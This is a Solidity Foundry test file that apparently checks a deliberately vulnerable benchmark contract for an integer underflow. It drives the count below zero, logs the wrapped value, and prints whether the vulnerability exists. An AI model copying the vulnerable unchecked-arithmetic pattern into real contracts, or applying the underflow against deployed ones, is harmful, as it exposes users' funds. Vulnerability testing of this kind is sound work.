// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/overflow_single_tx.sol";

contract IntegerOverflowTest is Test {
    IntegerOverflowSingleTransaction public targetContract;

    function setUp() public {
        targetContract = new IntegerOverflowSingleTransaction();
    }

    function test_UnderflowToState() public {
        // Setup: initialize counter state
        targetContract.overflowaddtostate(10);
        
        // Verify initial state
        assertEq(targetContract.totalOperations(), 1);
        
        console.log("--- BEFORE-Trigger Count ---");
        uint256 countBefore = targetContract.count();
        console.log("Count value before exploit:", countBefore);
        
        console.log("--- Trigger Underflow Operation ---");
        // Execute underflow operation (input > current count)
        targetContract.underflowtostate(20);
        
        console.log("--- AFTER-Trigger Count ---");
        uint256 countAfter = targetContract.count();
        console.log("Count value after exploit:", countAfter);
        
        // Compute expected underflow value using unchecked arithmetic
        uint256 expectedUnderflowValue;
        unchecked {
            expectedUnderflowValue = countBefore - 20;
        }
        
        bool underflowDetected = (countAfter > type(uint256).max / 2); 
        bool vulnerabilityExists = (countAfter == expectedUnderflowValue);
        
        console.log("Underflow detected:", underflowDetected ? "YES" : "NO");
        
        // Verify state was updated (should wrap to max uint - 9)
        assertEq(targetContract.totalOperations(), 2);
        
        // Final vulnerability verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: count underflow occurred (state became %s)", countAfter);
        } else {
            console.log("Vulnerability not Exist: No overflow detected in state change (expected %s, actual %s)", expectedUnderflowValue, countAfter);
        }
    }
}